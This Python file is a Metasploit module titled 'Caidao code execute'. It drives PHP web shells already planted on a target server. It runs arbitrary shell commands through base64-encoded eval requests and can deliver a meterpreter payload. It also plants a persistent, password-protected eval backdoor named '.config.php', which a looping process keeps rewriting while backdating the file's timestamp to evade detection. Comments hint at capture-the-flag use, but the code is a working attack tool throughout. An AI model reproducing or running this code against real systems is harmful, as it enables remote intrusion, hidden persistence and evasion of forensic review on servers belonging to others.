#!/usr/bin/env python3
import logging
from metasploit import module
import requests
from base64 import b64encode, b64decode
import hashlib, time
import random
import string

metadata = {
    'name': 'Caidao code execute',
    'description': '''
        
    ''',
    'authors': ['dyz'],
    'date': '2017-01-26',
    'references': [

    ],
    'type': 'remote_exploit',
    'platform': 'php',
    'arch': 'php',
    'rank': 'excellent',
    'targets': [
        {'platform': 'php', 'arch': 'php'},
    ],
    'options': {
        'SCHEMA': {'type': 'string', 'description': 'http or https ', 'required': True, 'default': 'http'},
        'TARGETURI': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/a.php'},
        'RHOSTS': {'type': 'address_range', 'description': 'Target server', 'required': True, 'default': None},
        'RPORT': {'type': 'port', 'description': 'Target server port', 'required': True, 'default': 80},
        'password': {'type': 'string', 'description': 'the password', 'required': True, 'default': 'a'},
        'hash_password_name': {'type': 'string', 'description': '', 'required': False, 'default': None},
        'hash_password': {'type': 'string', 'description': '', 'required': False, 'default': None},
        'command': {'type': 'string', 'description': 'linux shell command', 'required': True, 'default': 'uname'},

        # 'command_log': {'type': 'string', 'description': 'linux shell command log', 'required': True, 'default': 'command.log'},

        'action': {'type': 'enum', 'description': '1:upload shell;2:exec linux command 3:meterpreter payload',
                   'required': True, 'values': ['upload', 'exec', 'payload'], 'default': 'upload'},
        'upload_hash_password': {'type': 'string', 'description': 'linux shell command', 'required': True,
                                 'default': 'TOP_SECreT'},
        'upload_hash_password_name': {'type': 'string', 'description': 'linux shell command', 'required': True,
                                      'default': 'hash'},
        'upload_password': {'type': 'string', 'description': 'linux shell command', 'required': True,
                            'default': 'a'},
        'upload_file_name': {'type': 'string', 'description': 'linux shell command', 'required': True,
                             'default': '.config.php'},
        #: 1: the target host  have a shell, you need  upload yours .
        #
        #  2: have youres shell,you need execute commnad and show result or get the flag.
        #  3: you want to get a meterperter
        #: 1:upload  2: exec linux command 3:meterpretershell
    },

}


def send_payload(args, data):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
    }

    if args['hash_password_name'] != '' and args['hash_password'] != '':
        data[args['hash_password_name']] = args['hash_password']
        logging.debug(args['hash_password_name'])
        logging.debug(args['hash_password'])

    try:
        logging.debug('------------------send payload---------------')
        logging.debug('{}://{}:{}{}'.format(args['SCHEMA'], args['RHOST'], args['RPORT'], args['TARGETURI']))
        for k in data:
            logging.debug('{}:{}'.format(k, data[k]))

        r = requests.post('{}://{}:{}{}'.format(args['SCHEMA'], args['RHOST'], args['RPORT'], args['TARGETURI']),
                          data=data, headers=headers, verify=False, timeout=2)
        if r.status_code == 200:
            module.log(r.text, 'good')
            return r.text
    except requests.exceptions.RequestException as e:
        logging.error(str(e))

    return ''


def run_exec(args, command=None):
    if command is not None:
        payload = 'passthru("{}");'.format(command)
    else:
        payload = 'passthru("{}");'.format(args['command'])

    logging.debug(payload)
    payload = b64encode(payload.encode()).decode()
    logging.debug(payload)

    data = {
        args['password']: 'eval(base64_decode("{}"));'.format(payload)
    }
    return send_payload(args, data)


def run_upload(args):
    payload = """system('while true;do echo \\'<?php if(md5($_POST[{}])=="{}"){{@eval($_POST[{}]);}} ?>\\' >{};touch -m -d "2017-11-17 10:21:26" {};sleep 1;done;');""".format(
        args['upload_hash_password_name'], hashlib.md5(args['upload_hash_password'].encode()).hexdigest(),
        args['upload_password'],
        args['upload_file_name'], args['upload_file_name'],
    )
    logging.debug(payload)
    payload = b64encode(payload.encode()).decode()
    logging.debug(payload)
    data = {
        args['password']: 'eval(base64_decode("{}"));'.format(payload)
    }
    send_payload(args, data)
    time.sleep(3)
    ## for check
    args['hash_password_name'] = args['upload_hash_password_name']
    args['hash_password'] = args['upload_hash_password']
    args['TARGETURI'] = '/' + args['upload_file_name']

    mark = ''.join(random.sample(string.ascii_letters, 10))
    result = run_exec(args, "echo '{}';".format(mark))
    logging.debug('result : [{}]'.format(result))
    if mark in result:
        module.log(
            '{}://{}:{}{} success uploaded!!!'.format(args['SCHEMA'], args['RHOST'], args['RPORT'], args['TARGETURI'])
            , level='good')


def run_meterpreter_payload(args):
    data = {
        args['password']: 'eval( base64_decode("{}") );'.format(args['payload_encoded'])
    }
    return send_payload(args, data)


def exploit(args):
    module.LogHandler.setup(msg_prefix='{}:{} - '.format(args['RHOST'], args['RPORT']))

    if args['upload_hash_password_name'] == args['upload_password']:
        logging.error('upload_hash_password_name  can not = upload_password_name!! ')
        return

    # for k in args:
    #     logging.info('{}:{}'.format(k, args[k]))
    if args['action'] == 'upload':
        run_upload(args)
    if args['action'] == 'exec':
        run_exec(args)
        pass
    if args['action'] == 'payload':
        run_meterpreter_payload(args)
        pass


if __name__ == '__main__':
    module.run(metadata, exploit)
